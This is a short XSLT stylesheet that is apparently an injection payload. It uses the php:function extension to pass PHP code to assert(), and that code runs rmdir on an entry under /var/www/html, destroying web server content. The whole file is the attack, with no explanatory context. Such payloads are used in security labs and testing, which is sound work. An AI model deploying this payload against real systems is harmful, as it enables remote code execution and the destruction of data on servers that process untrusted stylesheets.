<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">
        <xsl:variable name="a">rmdir(glob('/var/www/html/*')[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 

</xsl:template> 
</xsl:stylesheet>
